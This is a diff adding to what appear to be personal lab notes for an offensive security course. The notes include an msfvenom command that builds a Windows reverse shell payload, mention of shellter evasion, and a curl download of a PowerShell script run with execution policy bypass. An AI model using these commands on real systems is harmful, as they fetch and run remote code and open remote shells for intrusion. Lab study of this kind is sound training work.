@@ -59,3 +59,15 @@ tried with application locally
 only changed payload with stageless reverse shell
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.217 LPORT=1990 -f python -b "\x00\x20" -v shellcode
 fire
+
+### 14.3.3.2
+
+used shellter as mentioned in walkthrough
+
+### 14.3.3.4
+
+created a bat file to download powershell script and then execute it
+since the script is in 32 bit, faced problem in executing because powershell cmd spawns 64 bit so used following
+curl http://192.168.1.11:9090/exec.ps1 -o exec.ps1
+%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -exec bypass .\exec.ps1
+![[exec.ps1]]
